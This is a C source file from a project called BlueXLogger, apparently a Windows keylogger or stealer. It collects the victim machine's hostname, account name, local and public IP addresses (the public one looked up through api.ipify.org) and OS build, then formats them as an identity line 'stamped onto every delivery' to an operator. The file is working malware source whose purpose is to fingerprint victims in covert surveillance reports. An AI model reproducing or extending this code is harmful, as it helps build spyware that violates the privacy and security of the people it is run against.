/*============================================================================
 * BlueXLogger - src/common/bxl_identity.c
 * Machine identity stamped onto every delivery.
 *
 * Created by Xencode-CLI by xanthorox
 *==========================================================================*/
#include "bxl_identity.h"
#include "bxl_util.h"
#include "bxl_http.h"

/*==========================================================================
 * OS version
 *========================================================================*/
/*
 * GetVersionExW lies unless the executable carries a supportedOS manifest
 * entry, and it is deprecated besides. RtlGetVersion reports the real build
 * unconditionally, so it is fetched dynamically rather than linked: ntdll is
 * always loaded, but the import would tie the binary to a private export.
 */
typedef struct BxlOsVersionInfo {
    ULONG  dwOSVersionInfoSize;
    ULONG  dwMajorVersion;
    ULONG  dwMinorVersion;
    ULONG  dwBuildNumber;
    ULONG  dwPlatformId;
    WCHAR  szCSDVersion[128];
} BxlOsVersionInfo;

typedef LONG (WINAPI *BxlRtlGetVersionFn)(BxlOsVersionInfo *);

static void detect_os(char *out, size_t out_cch)
{
    BxlOsVersionInfo vi;
    BxlRtlGetVersionFn fn;
    HMODULE ntdll;

    if (!out || !out_cch) return;
    out[0] = '\0';

    memset(&vi, 0, sizeof(vi));
    vi.dwOSVersionInfoSize = (ULONG)sizeof(vi);

    ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) { StringCchCopyA(out, out_cch, "Windows"); return; }

    fn = (BxlRtlGetVersionFn)(void *)GetProcAddress(ntdll, "RtlGetVersion");
    if (!fn || fn(&vi) != 0) { StringCchCopyA(out, out_cch, "Windows"); return; }

    {
        const char *name;
        if (vi.dwMajorVersion == 10 && vi.dwBuildNumber >= 22000)
            name = "Windows 11";
        else if (vi.dwMajorVersion == 10)
            name = "Windows 10";
        else if (vi.dwMajorVersion == 6 && vi.dwMinorVersion == 3)
            name = "Windows 8.1";
        else if (vi.dwMajorVersion == 6 && vi.dwMinorVersion == 2)
            name = "Windows 8";
        else if (vi.dwMajorVersion == 6 && vi.dwMinorVersion == 1)
            name = "Windows 7";
        else
            name = "Windows";

        StringCchPrintfA(out, out_cch, "%s %lu.%lu.%lu", name,
                         (unsigned long)vi.dwMajorVersion,
                         (unsigned long)vi.dwMinorVersion,
                         (unsigned long)vi.dwBuildNumber);
    }
}

/*==========================================================================
 * Local address
 *========================================================================*/
/*
 * The first non-loopback IPv4 the resolver returns for this machine's own
 * name. A host with no DNS entry for itself still resolves through the
 * hosts file, which is why this is preferred over enumerating adapters: it
 * reports the address the machine would actually be reached on, and it does
 * not pick up virtual switch adapters that a VPN or Hyper-V installs.
 */
static void detect_local_ip(char *out, size_t out_cch)
{
    char            name[256];
    struct addrinfo hints;
    struct addrinfo *res = NULL;
    struct addrinfo *it;

    if (!out || !out_cch) return;
    StringCchCopyA(out, out_cch, "unknown");

    if (gethostname(name, (int)sizeof(name)) != 0) return;
    name[sizeof(name) - 1] = '\0';

    memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(name, NULL, &hints, &res) != 0 || !res) return;

    for (it = res; it; it = it->ai_next) {
        if (it->ai_family != AF_INET) continue;
        {
            struct sockaddr_in *sa = (struct sockaddr_in *)it->ai_addr;
            unsigned long addr = ntohl(sa->sin_addr.s_addr);

            /* 127.0.0.0/8 and 169.254.0.0/16 are never useful as an
             * identifier, so skip them in favour of a routable address. */
            if ((addr >> 24) == 127) continue;
            if ((addr >> 16) == 0xA9FE) continue;

            if (inet_ntop(AF_INET, &sa->sin_addr, out, (size_t)out_cch))
                break;
        }
    }

    freeaddrinfo(res);
}

/*==========================================================================
 * Public address
 *========================================================================*/
void bxl_identity_resolve_public(BxlIdentity *id, int timeout_ms)
{
    BxlHttpResponse hr;
    char            buf[BXL_ID_ADDR];

    if (!id || id->public_attempted) return;
    id->public_attempted = 1;

    memset(&hr, 0, sizeof(hr));

    if (!bxl_http_get("api.ipify.org", 443, "/",
                      timeout_ms > 0 ? timeout_ms : 8000, &hr)) {
        bxl_logf("identity: public address lookup failed: %s",
                 hr.error[0] ? hr.error : "no reply");
        bxl_http_response_free(&hr);
        return;
    }

    if (hr.status == 200 && hr.body && hr.body_len) {
        /* The service answers with the bare address and no newline. Validate
         * the shape before trusting it: a captive portal or a proxy will
         * happily return an HTML error page with a 200. */
        size_t n = hr.body_len < sizeof(buf) - 1 ? hr.body_len : sizeof(buf) - 1;
        size_t i;
        int    looks_like_ipv4 = (n >= 7 && n <= 15);
        int    dots = 0;

        memcpy(buf, hr.body, n);
        buf[n] = 0;
        bxl_str_trim(buf);

        for (i = 0; buf[i]; i++) {
            char c = buf[i];
            if (c == '.') { dots++; continue; }
            if (c < '0' || c > '9') { looks_like_ipv4 = 0; break; }
        }

        if (looks_like_ipv4 && dots == 3)
            bxl_str_copy(id->public_ip, sizeof(id->public_ip), buf);
        else
            bxl_logf("identity: public address reply was not an IPv4 address");
    } else {
        bxl_logf("identity: public address lookup returned HTTP %d", hr.status);
    }

    bxl_http_response_free(&hr);
}

/*==========================================================================
 * Assembly
 *========================================================================*/
void bxl_identity_init(BxlIdentity *id)
{
    if (!id) return;
    memset(id, 0, sizeof(*id));

    bxl_hostname(id->hostname, sizeof(id->hostname));
    bxl_username(id->username, sizeof(id->username));
    detect_local_ip(id->local_ip, sizeof(id->local_ip));
    detect_os(id->os, sizeof(id->os));

    StringCchCopyA(id->public_ip, sizeof(id->public_ip), "unknown");
    id->public_attempted = 0;

    /* Fall back rather than emitting an empty field: an operator reading
     * "host=(unknown)" knows the lookup failed; an empty string reads as a
     * formatting bug. */
    if (!id->hostname[0]) StringCchCopyA(id->hostname, sizeof(id->hostname), "unknown");
    if (!id->username[0]) StringCchCopyA(id->username, sizeof(id->username), "unknown");
}

int bxl_identity_line(const BxlIdentity *id, char *out, size_t out_cch)
{
    /* Empty the caller's buffer before any check that can fail: a caller that
     * ignores the return value must never end up rendering stale identity. */
    if (!out || !out_cch) return BXL_FALSE;
    out[0] = 0;
    if (!id) return BXL_FALSE;

    return StringCchPrintfA(out, out_cch,
                            "HOST=%s USER=%s IP=%s/%s OS=%s",
                            id->hostname, id->username,
                            id->local_ip, id->public_ip, id->os) >= 0;
}

int bxl_identity_block(const BxlIdentity *id, char *out, size_t out_cch)
{
    if (!out || !out_cch) return BXL_FALSE;
    out[0] = 0;
    if (!id) return BXL_FALSE;

    return StringCchPrintfA(out, out_cch,
                            "Machine  : %s\r\n"
                            "Account  : %s\r\n"
                            "Local IP : %s\r\n"
                            "Public IP: %s\r\n"
                            "System   : %s\r\n",
                            id->hostname, id->username,
                            id->local_ip, id->public_ip, id->os) >= 0;
}

int bxl_identity_short(const BxlIdentity *id, char *out, size_t out_cch)
{
    if (!out || !out_cch) return BXL_FALSE;
    out[0] = 0;
    if (!id) return BXL_FALSE;

    return StringCchPrintfA(out, out_cch, "%s/%s",
                            id->hostname, id->username) >= 0;
}
